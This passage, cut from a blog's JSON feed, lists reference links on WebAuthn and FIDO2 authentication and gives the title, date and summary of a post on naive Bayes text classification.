href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。 ——我瞎编的 为什么这篇文章的标题是 NLP  […]","link":"https://flyhigher.top/develop/1989.html"}]